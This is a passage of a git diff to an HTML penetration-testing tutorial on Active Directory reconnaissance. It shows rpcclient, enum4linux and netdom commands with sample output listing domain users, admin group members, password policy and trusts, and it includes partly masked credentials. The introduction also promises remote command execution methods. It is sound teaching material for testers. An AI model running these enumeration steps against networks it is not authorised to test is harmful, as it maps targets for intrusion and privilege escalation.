@@ -17,9 +17,9 @@
         var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
       })();
     </script>
-    <title>Learning from the field : Administrative shells &#8212; tech.bitvijays.com</title>
+    <title>Learning from the field : Active Directory Recon and Administrative shells &#8212; tech.bitvijays.com</title>
     
-    <link rel="stylesheet" href="_static/sphinxdoc.css" type="text/css" />
+    <link rel="stylesheet" href="_static/pyramid.css" type="text/css" />
     <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
     
     <script type="text/javascript">
@@ -37,9 +37,14 @@
     <link rel="search" title="Search" href="search.html" />
     <link rel="top" title="tech.bitvijays.com" href="index.html" />
     <link rel="next" title="Learning from the field : Securing your Debian" href="LFFSecuringDebian.html" />
-    <link rel="prev" title="The Magic of Learning" href="index.html" /> 
+    <link rel="prev" title="The Magic of Learning" href="index.html" />
+<!--[if lte IE 6]>
+<link rel="stylesheet" href="_static/ie6.css" type="text/css" media="screen" charset="utf-8" />
+<![endif]-->
+
   </head>
   <body role="document">
+
     <div class="related" role="navigation" aria-label="related navigation">
       <h3>Navigation</h3>
       <ul>
@@ -51,77 +56,520 @@
              accesskey="P">previous</a> |</li>
         <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
       </ul>
-    </div>
-      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
-        <div class="sphinxsidebarwrapper">
-  <h3><a href="index.html">Table Of Contents</a></h3>
-  <ul>
-<li><a class="reference internal" href="#">Learning from the field : Administrative shells</a><ul>
-<li><a class="reference internal" href="#remote-code-execution-methods">Remote Code Execution Methods:</a><ul>
-<li><a class="reference internal" href="#winexe">Winexe</a></li>
-<li><a class="reference internal" href="#crackmapexec">crackmapexec</a></li>
-<li><a class="reference internal" href="#impacket-psexec-smbexe-wmiexec">Impacket psexec/ smbexe/ wmiexec</a></li>
-<li><a class="reference internal" href="#metasploit-psexec">Metasploit psexec</a></li>
-<li><a class="reference internal" href="#sysinternals-psexec">Sysinternals psexec</a></li>
-<li><a class="reference internal" href="#smbclient">smbclient:</a></li>
-<li><a class="reference internal" href="#rpclient">rpclient</a></li>
-<li><a class="reference internal" href="#enum4linux">Enum4linux</a></li>
-<li><a class="reference internal" href="#winrm">WinRM</a></li>
-<li><a class="reference internal" href="#wmi">WMI</a></li>
-<li><a class="reference internal" href="#dcom">DCOM</a></li>
-<li><a class="reference internal" href="#xfreerdp-remote-desktop">xfreerdp/ Remote Desktop</a></li>
-</ul>
-</li>
-<li><a class="reference internal" href="#add-remove-a-local-user">Add/ remove/ a local user</a></li>
-<li><a class="reference internal" href="#add-remove-a-local-user-to-administrator-group">Add / remove a local user to administrator group</a></li>
-<li><a class="reference internal" href="#get-sessions-of-remote-machines">Get sessions of remote machines</a></li>
-<li><a class="reference internal" href="#view-users-in-domain-workgroup">View users in Domain / Workgroup</a></li>
-<li><a class="reference internal" href="#view-machines-in-domain-workgroup">View machines in Domain/ Workgroup</a></li>
-<li><a class="reference internal" href="#id3">View users in Domain / Workgroup</a></li>
-<li><a class="reference internal" href="#hunting-for-a-particular-user">Hunting for a particular User?</a></li>
-</ul>
-</li>
-</ul>
-
-  <h4>Previous topic</h4>
-  <p class="topless"><a href="index.html"
-                        title="previous chapter">The Magic of Learning</a></p>
-  <h4>Next topic</h4>
-  <p class="topless"><a href="LFFSecuringDebian.html"
-                        title="next chapter">Learning from the field : Securing your Debian</a></p>
-  <h3>This Page</h3>
-  <ul class="this-page-menu">
-    <li><a href="_sources/LFFRemoteCodeExec.txt"
-           rel="nofollow">Show Source</a></li>
-    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFFRemoteCodeExec.rst"
-           rel="nofollow">Show on GitHub</a></li>
-    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFFRemoteCodeExec.rst"
-           rel="nofollow">Edit on GitHub</a></li>
-  </ul>
-<div id="searchbox" style="display: none" role="search">
-  <h3>Quick search</h3>
-    <form class="search" action="search.html" method="get">
-      <div><input type="text" name="q" /></div>
-      <div><input type="submit" value="Go" /></div>
-      <input type="hidden" name="check_keywords" value="yes" />
-      <input type="hidden" name="area" value="default" />
-    </form>
-</div>
-<script type="text/javascript">$('#searchbox').show(0);</script>
-        </div>
-      </div>
+    </div>  
 
     <div class="document">
       <div class="documentwrapper">
         <div class="bodywrapper">
           <div class="body" role="main">
             
-  <div class="section" id="learning-from-the-field-administrative-shells">
-<h1>Learning from the field : Administrative shells<a class="headerlink" href="#learning-from-the-field-administrative-shells" title="Permalink to this headline">¶</a></h1>
-<p>Once, we have access to a priviledged user of windows domain, there are multiple ways to get a execute remote commands on the remote machine.</p>
+  <div class="section" id="learning-from-the-field-active-directory-recon-and-administrative-shells">
+<h1>Learning from the field : Active Directory Recon and Administrative shells<a class="headerlink" href="#learning-from-the-field-active-directory-recon-and-administrative-shells" title="Permalink to this headline">¶</a></h1>
+<p>Once, we have access to <strong>credentials of a domain user of windows domain</strong>, we can utilize the credentials to do windows <strong>active directory enumeration</strong> such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, netdom, powerview, bloodhound, adexplorer, Jexplorer etc.</p>
+<p>Also, once we have <strong>administrative credentials</strong> there are multiple ways to get a <strong>execute remote commands</strong> on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples.</p>
+<p>Did we missed something? please send us a pull request and we will add it.</p>
+<div class="section" id="recon-active-directory">
+<h2>Recon Active Directory:<a class="headerlink" href="#recon-active-directory" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="rpclient">
+<h3>rpclient<a class="headerlink" href="#rpclient" title="Permalink to this headline">¶</a></h3>
+<p>eskoudis presents great amount of information at <a class="reference external" href="https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">Plundering Windows Account Infor via Authenticated SMB Session</a>.  carnal0wnage have written <a class="reference external" href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html">Enumerating user accounts on linux and OSX</a> and BlackHills have written <a class="reference external" href="http://www.blackhillsinfosec.com/?p=4645">Password Spraying and Other Fun with RPC Client</a>  Most of the stuff has been taken from the above three.</p>
+<ul class="simple">
+<li>Connection:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">xxxxs</span><span class="o">.</span><span class="n">hxxxx</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">mlxxxxh</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">65.103</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Version of the target Windows machine:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; srvinfo
+10.0.65.103    Wk Sv BDC Tim NT
+platform_id     :       500
+os version      :       6.3
+server type     :       0x801033
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>enum commands:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enum
+
+enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
+enumdata       enumdomgroups  enumforms      enumports   enumtrust
+enumdataex     enumdomusers   enumjobs       enumprinter
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Tell the current domain</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">enumdomains</span>
+<span class="n">name</span><span class="p">:[</span><span class="n">xxxx</span><span class="p">]</span> <span class="n">idx</span><span class="p">:[</span><span class="mh">0x0</span><span class="p">]</span>
+<span class="n">name</span><span class="p">:[</span><span class="n">Builtin</span><span class="p">]</span> <span class="n">idx</span><span class="p">:[</span><span class="mh">0x0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Enum Domain info</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querydominfo
+Domain               :  xxxx
+Server               :  HMC_PDC-TEMP
+Comment              :
+Total Users          :  9043
+Total Groups         :  0
+Total Aliases        :  616
+Sequence No          :  1
+Force Logoff         : -1
+Domain Server State  :  0x1
+Server Role          :  ROLE_DOMAIN_BDC
+Unknown 3           :    0x1
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Enum Domain users:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomusers
+user:[administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[_STANDARD] rid:[0x3ee]
+user:[Install] rid:[0x3fa]
+user:[sko] rid:[0x43a]
+user:[cap] rid:[0x589]
+user:[zentrale] rid:[0x67f]
+user:[dbserver] rid:[0x7d9]
+user:[JVOO] rid:[0x7fa]
+user:[Standard HMC User Te] rid:[0x8a0]
+user:[event] rid:[0x8d5]
+user:[remote] rid:[0x9ea]
+user:[pda-vis1] rid:[0xb65]
+user:[TestUser] rid:[0xc46]
+user:[oeinstall] rid:[0x1133]
+user:[repro] rid:[0x13c3]
+</pre></div>
+</div>
+</li>
+<li><p class="first">Enum Domain groups:</p>
+</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[xxxx Users] rid:[0x4d8]
+group:[IC Members] rid:[0x50d]
+group:[Event Management] rid:[0x8d7]
+group:[SMSInternalCliGrp] rid:[0x9f5]
+group:[IT Support] rid:[0x105b]
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Enum Group Information and Group Membership</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroup 0x200
+Group Name:     Domain Admins
+Description:    Designated administrators of the domain
+Group Attribute:7
+Num Members:16
+</pre></div>
+</div>
+<div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroupmem 0x200
+rid:[0x2227] attr:[0x7]
+rid:[0x3601] attr:[0x7]
+rid:[0x36aa] attr:[0x7]
+rid:[0x36e0] attr:[0x7]
+rid:[0x3c23] attr:[0x7]
+rid:[0x5528] attr:[0x7]
+rid:[0x1f4]  attr:[0x7]
+rid:[0x363b] attr:[0x7]
+rid:[0x573e] attr:[0x7]
+rid:[0x56bc] attr:[0x7]
+rid:[0x5e5e] attr:[0x7]
+rid:[0x7fe1] attr:[0x7]
+rid:[0x86d9] attr:[0x7]
+rid:[0x9367] attr:[0x7]
+rid:[0x829c] attr:[0x7]
+rid:[0xa26e] attr:[0x7]
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Enumerate specfic User/ computer information by RID</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; queryuser 0x3601
+User Name   :   dummy_s
+Full Name   :   Dummy User
+Home Drive  :
+Dir Drive   :
+Profile Path:
+Logon Script:
+Description :   E 5.5.2008 Admin
+Workstations:
+Comment     :
+Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
+Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
+Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
+Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
+Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
+Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Get Domain Password Policy</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; getdompwinfo
+min_password_length: 8
+password_properties: 0x00000000
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Get user password policies</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; getusrdompwinfo 0x3601
+min_password_length: 8
+&amp;info.password_properties: 0x433e6584 (1128162692)
+0: DOMAIN_PASSWORD_COMPLEX
+0: DOMAIN_PASSWORD_NO_ANON_CHANGE
+1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
+0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
+0: DOMAIN_PASSWORD_STORE_CLEARTEXT
+0: DOMAIN_REFUSE_PASSWORD_CHANGE
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="enum4linux">
+<h3>Enum4linux<a class="headerlink" href="#enum4linux" title="Permalink to this headline">¶</a></h3>
+<p>Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Usage</span><span class="p">:</span> <span class="o">./</span><span class="n">enum4linux</span><span class="o">.</span><span class="n">pl</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="n">ip</span>
+
+<span class="n">Options</span> <span class="n">are</span> <span class="p">(</span><span class="n">like</span> <span class="s2">&quot;enum&quot;</span><span class="p">):</span>
+    <span class="o">-</span><span class="n">U</span>        <span class="n">get</span> <span class="n">userlist</span>
+    <span class="o">-</span><span class="n">M</span>        <span class="n">get</span> <span class="n">machine</span> <span class="nb">list</span><span class="o">*</span>
+    <span class="o">-</span><span class="n">S</span>        <span class="n">get</span> <span class="n">sharelist</span>
+    <span class="o">-</span><span class="n">P</span>        <span class="n">get</span> <span class="n">password</span> <span class="n">policy</span> <span class="n">information</span>
+    <span class="o">-</span><span class="n">G</span>        <span class="n">get</span> <span class="n">group</span> <span class="ow">and</span> <span class="n">member</span> <span class="nb">list</span>
+    <span class="o">-</span><span class="n">d</span>        <span class="n">be</span> <span class="n">detailed</span><span class="p">,</span> <span class="n">applies</span> <span class="n">to</span> <span class="o">-</span><span class="n">U</span> <span class="ow">and</span> <span class="o">-</span><span class="n">S</span>
+    <span class="o">-</span><span class="n">u</span> <span class="n">user</span>   <span class="n">specify</span> <span class="n">username</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="o">-</span><span class="n">p</span> <span class="k">pass</span>   <span class="n">specify</span> <span class="n">password</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+
+
+<span class="n">Additional</span> <span class="n">options</span><span class="p">:</span>
+   <span class="o">-</span><span class="n">a</span>        <span class="n">Do</span> <span class="nb">all</span> <span class="n">simple</span> <span class="n">enumeration</span> <span class="p">(</span><span class="o">-</span><span class="n">U</span> <span class="o">-</span><span class="n">S</span> <span class="o">-</span><span class="n">G</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">.</span>
+             <span class="n">This</span> <span class="n">opion</span> <span class="ow">is</span> <span class="n">enabled</span> <span class="k">if</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t provide any other options.</span>
+   <span class="o">-</span><span class="n">h</span>        <span class="n">Display</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
+   <span class="o">-</span><span class="n">r</span>        <span class="nb">enumerate</span> <span class="n">users</span> <span class="n">via</span> <span class="n">RID</span> <span class="n">cycling</span>
+   <span class="o">-</span><span class="n">R</span> <span class="nb">range</span>  <span class="n">RID</span> <span class="n">ranges</span> <span class="n">to</span> <span class="nb">enumerate</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="mi">500</span><span class="o">-</span><span class="mi">550</span><span class="p">,</span><span class="mi">1000</span><span class="o">-</span><span class="mi">1050</span><span class="p">,</span> <span class="n">implies</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span>
+   <span class="o">-</span><span class="n">K</span> <span class="n">n</span>      <span class="n">Keep</span> <span class="n">searching</span> <span class="n">RIDs</span> <span class="n">until</span> <span class="n">n</span> <span class="n">consective</span> <span class="n">RIDs</span> <span class="n">don</span><span class="s1">&#39;t correspond to</span>
+             <span class="n">a</span> <span class="n">username</span><span class="o">.</span>  <span class="n">Impies</span> <span class="n">RID</span> <span class="nb">range</span> <span class="n">ends</span> <span class="n">at</span> <span class="mf">999999.</span> <span class="n">Useful</span>
+             <span class="n">against</span> <span class="n">DCs</span><span class="o">.</span>
+   <span class="o">-</span><span class="n">l</span>        <span class="n">Get</span> <span class="n">some</span> <span class="p">(</span><span class="n">limited</span><span class="p">)</span> <span class="n">info</span> <span class="n">via</span> <span class="n">LDAP</span> <span class="mi">389</span><span class="o">/</span><span class="n">TCP</span> <span class="p">(</span><span class="k">for</span> <span class="n">DCs</span> <span class="n">only</span><span class="p">)</span>
+   <span class="o">-</span><span class="n">s</span> <span class="n">file</span>   <span class="n">brute</span> <span class="n">force</span> <span class="n">guessing</span> <span class="k">for</span> <span class="n">share</span> <span class="n">names</span>
+   <span class="o">-</span><span class="n">k</span> <span class="n">user</span>   <span class="n">User</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">that</span> <span class="n">exists</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">system</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="n">administrator</span><span class="p">,</span><span class="n">guest</span><span class="p">,</span><span class="n">krbtgt</span><span class="p">,</span><span class="n">domain</span> <span class="n">admins</span><span class="p">,</span><span class="n">root</span><span class="p">,</span><span class="nb">bin</span><span class="p">,</span><span class="n">none</span><span class="p">)</span>
+             <span class="n">Used</span> <span class="n">to</span> <span class="n">get</span> <span class="n">sid</span> <span class="k">with</span> <span class="s2">&quot;lookupsid known_username&quot;</span>
+             <span class="n">Use</span> <span class="n">commas</span> <span class="n">to</span> <span class="k">try</span> <span class="n">several</span> <span class="n">users</span><span class="p">:</span> <span class="s2">&quot;-k admin,user1,user2&quot;</span>
+   <span class="o">-</span><span class="n">o</span>        <span class="n">Get</span> <span class="n">OS</span> <span class="n">information</span>
+   <span class="o">-</span><span class="n">i</span>        <span class="n">Get</span> <span class="n">printer</span> <span class="n">information</span>
+   <span class="o">-</span><span class="n">w</span> <span class="n">wrkg</span>   <span class="n">Specify</span> <span class="n">workgroup</span> <span class="n">manually</span> <span class="p">(</span><span class="n">usually</span> <span class="n">found</span> <span class="n">automatically</span><span class="p">)</span>
+   <span class="o">-</span><span class="n">n</span>        <span class="n">Do</span> <span class="n">an</span> <span class="n">nmblookup</span> <span class="p">(</span><span class="n">similar</span> <span class="n">to</span> <span class="n">nbtstat</span><span class="p">)</span>
+   <span class="o">-</span><span class="n">v</span>        <span class="n">Verbose</span><span class="o">.</span>  <span class="n">Shows</span> <span class="n">full</span> <span class="n">commands</span> <span class="n">being</span> <span class="n">run</span> <span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">rpcclient</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">enum4linux</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">d</span> <span class="n">xxxx</span><span class="o">.</span><span class="n">abcxxx</span><span class="o">.</span><span class="n">net</span> <span class="o">-</span><span class="n">u</span> <span class="n">mluxxxx</span> <span class="o">-</span><span class="n">p</span> <span class="n">threxxxx</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">65.103</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="active-directory-explorer-adexplorer">
+<h3>Active Directory Explorer ADExplorer<a class="headerlink" href="#active-directory-explorer-adexplorer" title="Permalink to this headline">¶</a></h3>
+<p>As per the technet article <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/adexplorer.aspx">Active Directory Explorer (AD Explorer)</a> is an advanced Active Directory (AD) viewer and editor. We can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object&#8217;s schema, and execute sophisticated searches that you can save and re-execute.</p>
+</div>
+<div class="section" id="jxplorer">
+<h3>JXplorer<a class="headerlink" href="#jxplorer" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="http://jxplorer.org/">JXplorer</a> is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.</p>
+</div>
+<div class="section" id="netdom">
+<h3>netdom<a class="headerlink" href="#netdom" title="Permalink to this headline">¶</a></h3>
+<p>netdom: netdom is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the Active Directory Domain Services (AD DS) server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT). More information available at <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc835089(v=ws.11).aspx">Netdom query</a>.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>netdom query {/d: | /domain:}&lt;Domain&gt; [{/s: | /server:}&lt;Server&gt;] [{/ud: | /userd:}[&lt;Domain&gt;\]&lt;User&gt; {/pd: | /passwordd}{&lt;Password&gt;|*}] [/verify] [/reset] [/direct] {WORKSTATION|SERVER|DC|OU|PDC|FSMO|TRUST} [{/help | /?}]
+
+Specifies the type of list to generate. The following list shows the possible objects:
+WORKSTATION: Queries the domain for the list of workstations.
+SERVER: Queries the domain for the list of servers.
+DC   : Queries the domain for the list of domain controllers.
+OU   : Queries the domain for the list of OUs under which the user that you specify can create a computer object.
+PDC  : Queries the domain for the current primary domain controller.
+FSMO : Queries the domain for the current list of operations master role holders. These role holders are also known as flexible single master operations (FSMO).
+TRUST: Queries the domain for the list of its trusts.
+</pre></div>
+</div>
+<ul class="simple">
+<li>DC: Queries the domain for the list of workstations:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">domain</span> <span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="n">DC</span>
+<span class="n">List</span> <span class="n">of</span> <span class="n">domain</span> <span class="n">controllers</span> <span class="k">with</span> <span class="n">accounts</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">domain</span><span class="p">:</span>
+
+<span class="n">xxxxDC12</span>
+<span class="n">xxxxDC11</span>
+<span class="n">xxxxDC04</span>
+<span class="n">xxxxDC03</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>PDC: Queries the domain for the current primary domain controller</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">domain</span> <span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="n">PDC</span>
+<span class="n">Primary</span> <span class="n">domain</span> <span class="n">controller</span> <span class="k">for</span> <span class="n">the</span> <span class="n">domain</span><span class="p">:</span>
+
+<span class="n">xxxxDC03</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>FSMO: Queries the domain for the current list of operations master role holders.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">domain</span> <span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="n">FSMO</span>
+<span class="n">Schema</span> <span class="n">master</span>               <span class="n">xxxxDC03</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">Domain</span> <span class="n">naming</span> <span class="n">master</span>        <span class="n">xxxxDC03</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">PDC</span>                         <span class="n">xxxxDC03</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">RID</span> <span class="n">pool</span> <span class="n">manager</span>            <span class="n">xxxxDC03</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">Infrastructure</span> <span class="n">master</span>       <span class="n">xxxxDC03</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>TRUST: Queries the domain for the list of its trusts</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">domain</span> <span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="n">TRUST</span>
+<span class="n">Direction</span> <span class="n">Trusted</span>\<span class="n">Trusting</span> <span class="n">domain</span>      <span class="n">Trust</span> <span class="nb">type</span>
+<span class="o">=========</span> <span class="o">=======================</span>      <span class="o">==========</span>
+
+<span class="o">&lt;-&gt;</span>       <span class="n">xxxx</span><span class="o">.</span><span class="n">xxxxxx</span><span class="o">.</span><span class="n">net</span>              <span class="n">Direct</span>
+<span class="o">&lt;-&gt;</span>       <span class="n">xxxx</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>             <span class="n">Direct</span>
+<span class="o">&lt;-&gt;</span>       <span class="n">XX</span><span class="o">.</span><span class="n">XXXxXX</span><span class="o">.</span><span class="n">NET</span>                <span class="n">Direct</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>OU: Queries the domain for the list of OUs under which the user that you specify can create a computer object.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">domain</span> <span class="n">abc</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="n">OU</span>
+<span class="n">List</span> <span class="n">of</span> <span class="n">Organizational</span> <span class="n">Units</span> <span class="n">within</span> <span class="n">which</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">user</span> <span class="n">can</span> <span class="n">create</span> <span class="n">a</span>
+<span class="n">machine</span> <span class="n">account</span><span class="p">:</span>
+
+<span class="n">OU</span><span class="o">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">OU</span><span class="o">=</span><span class="n">ABC</span><span class="o">-</span><span class="n">Admin</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">OU</span><span class="o">=</span><span class="n">ServiceAccounts</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">ABC</span><span class="o">-</span><span class="n">Admin</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">OU</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">ABC</span><span class="o">-</span><span class="n">Admin</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">ABC</span><span class="o">-</span><span class="n">Admin</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
